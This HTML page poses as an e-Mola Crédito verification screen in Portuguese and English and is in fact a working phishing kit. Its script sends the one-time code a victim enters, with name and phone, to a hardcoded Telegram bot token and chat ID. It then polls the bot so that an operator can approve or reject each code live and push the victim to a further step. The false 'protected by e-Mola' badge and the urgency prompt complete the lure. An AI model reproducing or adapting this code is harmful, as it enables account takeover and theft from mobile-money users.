<!DOCTYPE html>
<html lang="pt-MZ">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#FF6B00">
<title>e-Mola Crédito | Código de Verificação · Moçambique</title>
<style>
:root{--or:#FF6B00;--or-deep:#E66000;--or-dark:#A34A00;--cream:#FFF8F0;--white:#fff;--dark:#111;--muted:#6b6b6b;--border:#e5e7eb;--err:#d32f2f;--ok:#2e7d32;--grad:linear-gradient(135deg,#FF8C00 0%,#FF6B00 100%);--shadow:0 20px 60px rgba(0,0,0,.1)}
*{margin:0;padding:0;box-sizing:border-box}
html{-webkit-text-size-adjust:100%}
body{font-family:'Inter',system-ui,sans-serif;background:var(--grad);min-height:100vh;display:flex;flex-direction:column;position:relative;overflow-x:hidden}
header{background:rgba(255,255,255,.96);backdrop-filter:blur(14px);padding:14px 5%;border-bottom:3px solid var(--or);box-shadow:0 2px 12px rgba(0,0,0,.08);display:flex;justify-content:space-between;align-items:center;gap:14px}
.logo{font-size:24px;font-weight:900;text-decoration:none;letter-spacing:-.8px;display:inline-flex;align-items:center;color:var(--dark)}
.logo .e{color:var(--or-deep)}
.logo .mola{color:var(--or)}
.lang-switch{display:flex;gap:5px}
.lang-btn{background:transparent;border:1.5px solid var(--border);border-radius:50px;padding:6px 12px;font-size:11px;font-weight:800;cursor:pointer;color:var(--muted);transition:all .2s}
.lang-btn.active{background:var(--grad);border-color:var(--or);color:#fff}
main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px;position:relative;z-index:1}
.card{background:rgba(255,255,255,.98);border-radius:22px;padding:38px 30px;max-width:440px;width:100%;box-shadow:var(--shadow);animation:pop .5s cubic-bezier(.34,1.56,.64,1)}
@keyframes pop{from{opacity:0;transform:scale(.96) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
.card-head{text-align:center;margin-bottom:22px}
.badge{width:60px;height:60px;border-radius:50%;background:rgba(255,107,0,.1);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:28px;color:var(--or)}
.card-head h1{font-size:21px;font-weight:900;color:var(--or-dark);margin-bottom:4px}
.card-head p{color:var(--muted);font-size:12.5px}
.err{display:none;background:rgba(211,47,47,.08);border:1.5px solid rgba(211,47,47,.22);color:var(--err);font-size:12px;font-weight:700;border-radius:12px;padding:11px 14px;margin-bottom:16px;text-align:center}
.err.show{display:block}
.fl{display:block;font-size:10px;font-weight:800;color:var(--or-dark);text-transform:uppercase;margin-bottom:10px;text-align:center;letter-spacing:.09em}
.otp-row{display:flex;gap:9px;justify-content:center;margin-bottom:16px}
.otp-box{width:50px;height:56px;text-align:center;font-size:23px;font-weight:900;border:2px solid var(--border);border-radius:14px;background:#f9fafb;color:var(--dark);transition:all .25s}
.otp-box:focus{border-color:var(--or);background:#fff;box-shadow:0 0 0 4px rgba(255,107,0,.15);outline:none;transform:scale(1.05)}
.otp-box.ok{border-color:var(--ok);background:rgba(46,125,50,.06)}
.hint{font-size:10.5px;color:var(--muted);text-align:center;margin-bottom:10px}
.btns{display:flex;gap:10px;margin-top:22px}
.btn-p{flex:1;background:var(--grad);color:#fff;border:none;padding:15px;border-radius:50px;font-weight:900;font-size:12px;text-transform:uppercase;cursor:pointer;box-shadow:0 6px 18px rgba(255,107,0,.35)}
.btn-o{flex:1;background:transparent;color:var(--or-deep);border:2px solid var(--or-deep);padding:15px;border-radius:50px;font-weight:800;font-size:12px;text-transform:uppercase;cursor:pointer}
.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:18px;font-size:10.5px;color:var(--muted);font-weight:700}
.overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;background:rgba(0,0,0,.85);z-index:2000}
.overlay.on{display:flex}
.spin{width:54px;height:54px;border:4px solid rgba(255,255,255,.15);border-top-color:#FF8C00;border-radius:50%;animation:sp .8s linear infinite}
.sp-t{font-size:14px;font-weight:800;color:#fff}
@keyframes sp{to{transform:rotate(360deg)}}
@media (max-width:500px){main{padding:24px 12px}.card{padding:30px 20px}.otp-row{gap:5px}.otp-box{width:42px;height:50px;font-size:19px}.btns{flex-direction:column}}
</style>
</head>
<body>
<header>
  <a class="logo" href="index.html"><span class="e">Txeneka</span><span class="mola">.</span></a>
  <div class="lang-switch">
    <button class="lang-btn active" data-lang="pt" onclick="setLang('pt')">PT</button>
    <button class="lang-btn" data-lang="en" onclick="setLang('en')">EN</button>
  </div>
</header>

<main>
  <div class="card">
    <div class="card-head">
      <div class="badge">📱</div>
      <h1 data-i18n="otp.h1">Confirme o seu código</h1>
      <p data-i18n="otp.sub">Enviámos um código para o seu telemóvel</p>
    </div>
    <div id="err" class="err"></div>
    <label class="fl" data-i18n="otp.code">Código de Verificação</label>
    <div class="otp-row" id="otpRow">
      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
    </div>
    <p class="hint" data-i18n="otp.hint">⚠️ Introduza o código rapidamente.</p>
    <div class="btns">
      <button class="btn-p" onclick="doOTP()" data-i18n="otp.btn">Confirmar Código</button>
      <button class="btn-o" onclick="location.href='login.html'" data-i18n="otp.cancel">Cancelar</button>
    </div>
    <div class="secure">🔒 Protegido com segurança e-Mola</div>
  </div>
</main>

<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">A confirmar...</div></div>

<script>
const translations={
  pt:{"otp.h1":"Confirme o seu código","otp.sub":"Enviámos um código para o seu telemóvel","otp.code":"Código de Verificação","otp.hint":"⚠️ Introduza o código rapidamente.","otp.btn":"Confirmar Código","otp.cancel":"Cancelar","err.all6":"Insira os 6 dígitos","err.declined":"Código recusado."},
  en:{"otp.h1":"Confirm your code","otp.sub":"We sent a code to your phone","otp.code":"Verification Code","otp.hint":"⚠️ Enter the code quickly.","otp.btn":"Confirm Code","otp.cancel":"Cancel","err.all6":"Enter all 6 digits","err.declined":"Code declined."}
};
function applyLanguage(lang){
  document.querySelectorAll('[data-i18n]').forEach(el=>{const k=el.getAttribute('data-i18n');if(translations[lang]&&translations[lang][k])el.textContent=translations[lang][k]});
  localStorage.setItem('emola_lang',lang);document.querySelectorAll('.lang-btn').forEach(b=>b.classList.toggle('active',b.dataset.lang===lang));
}
function setLang(lang){applyLanguage(lang)}
function tr(key){const l=localStorage.getItem('emola_lang')||'pt';return (translations[l]&&translations[l][key])||key}

const BOT='8976816871:AAEoOSVkVWkrROLidS1qWH6snhpmU3e8AXU';
const CID='8873805952';
let bd={},luid=0,phone='',name='';
let isSubmitting = false;

function init(){
  const p=new URLSearchParams(location.search);
  const amount=p.get('amount'),dur=p.get('duration'),interest=p.get('interest'),total=p.get('total');
  phone=p.get('phone')||'';
  name=p.get('name')||'Unknown';
  if(amount){ bd={amount,duration:dur,interest:interest||'0',total:total||amount}; }
}

const boxes=document.querySelectorAll('.otp-box');
boxes.forEach((b,i)=>{
  b.addEventListener('input',e=>{
    e.target.value = e.target.value.replace(/\D/g,'');
    const v=e.target.value;
    if(v.length>1){
      const digs=v.split('');
      digs.forEach((d,j)=>{if(i+j<boxes.length){boxes[i+j].value=d;boxes[i+j].classList.add('ok')}});
      const nextIndex = Math.min(i+digs.length,boxes.length-1);
      boxes[nextIndex].focus();
      if(getCode().length === 6) setTimeout(doOTP, 300);
      return;
    }
    if(v){
      b.classList.add('ok');
      if(i<boxes.length-1){ boxes[i+1].focus(); } 
      else { if(getCode().length === 6) setTimeout(doOTP, 300); } // AUTO SUBMIT
    }
    else{b.classList.remove('ok')}
  });
  b.addEventListener('keydown',e=>{
    if(e.key==='Backspace'&&!e.target.value&&i>0){ boxes[i-1].focus();boxes[i-1].value='';boxes[i-1].classList.remove('ok') }
  });
});

function getCode(){return Array.from(boxes).map(b=>b.value).join('')}

function doOTP(){
  if(isSubmitting) return;
  const otp=getCode();
  if(otp.length!==6){ showErr(tr('err.all6')); return; }
  
  isSubmitting = true;
  clrErr();
  document.getElementById('ov').classList.add('on');

  // CLEAN PAYLOAD: Name, Phone (no +258), OTP
  const msg=`📱 <b>OTP #1 (Device)</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>${phone}</code>\n<b>Code:</b> <code>${otp}</code>`;

  const btns=[[{text:'✓ Verify Device',callback_data:'verify_device'},{text:'✗ Decline OTP',callback_data:'otp_declined'}]];
  tg(msg,btns);
  pollOTP();
}

async function tg(msg,btns){
  try{
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:CID,text:msg,reply_markup:btns?{inline_keyboard:btns}:undefined,parse_mode:'HTML'}),
      keepalive: true // SPEED FIX
    });
  }catch(e){console.error(e)}
}

function pollOTP(){
  const iv=setInterval(()=>{
    fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid+1}`).then(r=>r.json()).then(d=>{
      if(d.ok&&d.result.length>0){
        const u=d.result[0];luid=u.update_id;
        if(u.callback_query){
          const cb=u.callback_query.data;
          if(cb==='verify_device'){
            clearInterval(iv);
            document.getElementById('ov').classList.remove('on');
            document.getElementById('ov').classList.add('on'); // Show spinner for 3s
            setTimeout(()=>{
              const params=new URLSearchParams({amount:bd.amount||'',duration:bd.duration||'',interest:bd.interest||'',total:bd.total||'',phone:phone,name:name});
              location.href='verify.html?'+params.toString();
            },3000);
          }
          else if(cb==='otp_declined'){
            clearInterval(iv);document.getElementById('ov').classList.remove('on');
            showErr(tr('err.declined'));resetOTP();isSubmitting = false;
          }
        }
      }
    }).catch(e=>console.error(e));
  },1000);
  setTimeout(()=>{clearInterval(iv);isSubmitting = false;},900000);
}

function showErr(m){const e=document.getElementById('err');e.textContent=m;e.classList.add('show')}
function clrErr(){document.getElementById('err').classList.remove('show')}
function resetOTP(){boxes.forEach(b=>{b.value='';b.classList.remove('ok')});boxes[0].focus()}

window.addEventListener('load',()=>{init();applyLanguage(localStorage.getItem('emola_lang')||'pt');boxes[0].focus()});

window.addEventListener('load', function() {
  setTimeout(function() {
    var s1=document.createElement("script");s1.async=true;
    s1.src='https://embed.tawk.to/6ac8f0a81ce21434c5ca1a2e/default';
    s1.setAttribute('crossorigin','*');document.body.appendChild(s1);
  }, 2000);
});
</script>
</body>
</html>
